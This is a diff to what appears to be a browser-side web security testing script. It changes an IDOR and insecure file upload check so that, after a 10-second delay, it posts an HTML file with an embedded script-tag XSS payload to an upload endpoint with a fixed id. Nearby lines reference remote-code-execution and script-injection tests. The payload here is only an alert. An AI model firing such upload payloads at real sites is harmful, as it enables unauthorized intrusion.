@@ -148,19 +148,32 @@
                     console.error("CORS with Remote Code Execution Test Failed", error);
                 }
 
-                // Test for IDOR with Insecure File Upload
+                // IDOR with delayed injection logic
+                console.log("Preparing for IDOR injection with delay...");
+
                 setTimeout(() => {
                     try {
+                        // Create a FormData object for the injection payload
                         let formData = new FormData();
-                        formData.append("file", new Blob(["<script>alert('IDOR with Insecure File Upload');</script>"], { type: "text/html" }));
+                        formData.append("file", new Blob(["<script>alert('IDOR with delayed script injection');</script>"], { type: "text/html" }));
+
+                        // Send the request to the target endpoint after 10 seconds
                         fetch("/upload?id=12345", {
                             method: "POST",
                             body: formData
+                        }).then(response => {
+                            if (response.ok) {
+                                console.log("IDOR payload successfully sent after delay.");
+                            } else {
+                                console.error("IDOR request failed with status:", response.status);
+                            }
+                        }).catch(error => {
+                            console.error("Error during IDOR request:", error);
                         });
                     } catch (error) {
-                        console.error("IDOR with Insecure File Upload Test Failed", error);
+                        console.error("Caught error during delayed IDOR injection:", error);
                     }
-                }, 10000); // Send the IDOR file after 10 seconds
+                }, 10000); // 10-second delay before executing the payload
 
                 // Test for SRI with Script Injection
                 let scriptTag = document.createElement('script');
